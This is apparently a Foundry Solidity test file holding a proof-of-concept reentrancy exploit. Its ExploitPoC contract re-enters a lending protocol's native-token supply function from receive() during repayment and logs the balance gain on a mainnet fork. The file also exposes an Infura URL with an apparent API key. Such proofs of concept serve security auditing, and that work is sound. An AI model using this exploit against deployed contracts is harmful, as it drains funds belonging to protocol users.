// SPDX-License-Identifier: unlicensed
pragma solidity ^0.8.25;

import {Test, Vm, console} from "forge-std/Test.sol";
import {IMarketPositionManager} from "../../../contracts/interfaces/IMarketPositionManager.sol";
import {ISwapTWAPOracle} from "../../../contracts/interfaces/ISwapTWAPOracle.sol";
import {IBaseProtocol} from "../../../contracts/interfaces/IBaseProtocol.sol";
import {SFProtocolToken} from "../../../contracts/SFProtocolToken.sol";
import {HBARProtocol} from "../../../contracts/HBARProtocol.sol";
import {MarketPositionManager} from "../../../contracts/MarketPositionManager.sol";
import {Helpers} from "../utils/Helpers.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";

/**
 * @title AttackTest Test Suite
 */
contract AttackTest is Helpers {
    address owner;
    address user1;
    address user2;
    address liquidator;
    address borrower;

    uint256 underlyingHBAR;
    uint256 underlyingSFBTC;
    uint256 underlyingSFETH;
    uint256 underlyingSFUSDC;

    uint256 liquidateRiskThreshold;
    uint256 userBalancePreBorrow;
    uint256 underlyingAmount;

    /**
     * @notice Sets up the environment for the liquidation tests.
     * @dev Forks the Ethereum mainnet, deploys contracts, and prepares users with balances for testing.
     */
    function setUp() public {
        vm.createSelectFork(
            "https://mainnet.infura.io/v3/b812db1f09b54c7aac2fee91b2fc90da",
            20269878
        );

        user1 = makeAddr("user_one");
        user2 = makeAddr("user_two");
        owner = makeAddr("owner");
        liquidator = makeAddr("liquidator");
        borrower = makeAddr("borrower");

        deployContracts(owner);
        vm.startPrank(owner);
        sfHBAR.acceptOwnership();
        vm.stopPrank();

        address[] memory users = new address[](8);
        users[0] = user1;
        users[1] = user2;
        users[2] = address(this);
        users[3] = owner;
        users[4] = borrower;
        users[5] = borrower;
        users[6] = liquidator;
        users[7] = liquidator;

        dealBunch(users);

        vm.startPrank(owner);

        marketPositionManager.addToMarket(address(sfHBAR));
        marketPositionManager.addToMarket(address(sfWBTC));
        marketPositionManager.addToMarket(address(sfWEth));
        marketPositionManager.addToMarket(address(sfUSDC));

        address[] memory tokens = new address[](4);
        uint256[] memory borrowCups = new uint256[](4);
        tokens[0] = address(sfHBAR);
        tokens[1] = address(sfWBTC);
        tokens[2] = address(sfWEth);
        tokens[3] = address(sfUSDC);

        borrowCups[0] = 60;
        borrowCups[1] = 80;
        borrowCups[2] = 80;
        borrowCups[3] = 75;

        marketPositionManager.setLoanToValue(tokens, borrowCups);

        underlyingHBAR = 432;
        underlyingSFBTC = 0;
        underlyingSFETH = 1;
        underlyingSFUSDC = 427;

        mockSupraOracle.changeTokenPrice(432, 1 ether); // hbar
        mockSupraOracle.changeTokenPrice(0, 1 ether); // btc
        mockSupraOracle.changeTokenPrice(1, 1 ether); // eth
        mockSupraOracle.changeTokenPrice(427, 1 ether); // usdc

        vm.stopPrank();
    }

    function test_hack() public {
        supplyUnderlyingHBAR(100 * HBARs, user1);

        sfHBAR.totalShares();
        warpTimeForwards(10);

        ExploitPoC exploiter = new ExploitPoC(
            address(sfHBAR),
            address(marketPositionManager)
        );

        vm.prank(liquidator);
        exploiter.supply{value: 200 * HBARs}();

        vm.prank(liquidator);
        uint256 balance = address(exploiter).balance;
        console.log("balance before: ", balance);
        exploiter.execute();

        balance = address(exploiter).balance;
        console.log("balance after: ", balance);
    }
}

contract ExploitPoC {
    SFProtocolToken sfWBTC;
    SFProtocolToken sfUSDC;
    SFProtocolToken sfWEth;
    HBARProtocol sfHBAR;
    MarketPositionManager marketPositionManager;
    bool processHack;

    constructor(address _sfUSDC, address _marketPositionManager) {
        sfHBAR = HBARProtocol(_sfUSDC);
        marketPositionManager = MarketPositionManager(_marketPositionManager);
    }

    // 20000000000
    // 1000000000 - 50000000000
    // 10000000000 - 500000000000
    // 11000000000
    // 18879173553
    // 20000000000
    function execute() public {
        sfHBAR.supplyUnderlyingNative{value: (10 * 1e8)}();
        sfHBAR.borrow(1);
        processHack = true;
        sfHBAR.repayBorrowNative{value: (100 * 1e8)}();
        processHack = false;
        (uint256 shares, , , ) = sfHBAR.getAccountSnapshot(address(this));
        sfHBAR.redeem(shares);
    }

    function supply() external payable {}

    receive() external payable {
        if (processHack) {
            sfHBAR.supplyUnderlyingNative{value: 100 * 1e8}();
        } else {}
    }
}
